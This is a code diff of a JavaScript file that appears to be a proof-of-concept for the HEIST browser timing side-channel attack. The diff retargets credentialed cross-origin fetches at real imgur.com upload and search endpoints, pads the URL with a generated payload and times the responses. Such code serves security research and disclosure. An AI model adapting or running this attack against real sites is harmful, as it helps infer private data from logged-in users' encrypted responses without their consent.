@@ -2,7 +2,9 @@ function start() {
   console.log('starting...');
 
   var site = 'https://github.com/edwinschaap/heist/raw/gh-pages/index.html';
-  fetchUrl(site, 4000);
+  site = 'https://imgur.com/upload';
+  site = 'https://imgur.com/search/score?q=';
+  fetchUrl(site, 45000);
 
 }
 
@@ -13,7 +15,8 @@ function fetchUrl(site, payloadSize) {
   console.log('Payload size: '+ payloadSize);
   var payload = generatePayload(payloadSize);
 
-  site += '?a='+payload+'&b='+generatePayload(4000);//+'&c='+generatePayload(4000)+'&d='+generatePayload(4000);
+  // site += '?a='+payload+'&b='+generatePayload(4000);//+'&c='+generatePayload(4000)+'&d='+generatePayload(4000);
+  site += payload;
 
   console.log('setting interval');
   interval = setInterval(function(){
@@ -33,9 +36,6 @@ function fetchUrl(site, payloadSize) {
     redirect: 'manual',
     cache: 'no-cache',
     credentials: 'include',
-    headers: {
-      'X-Heist': 'blaat'
-    }
   })
   .then(function(result){
     T1 = performance.now();
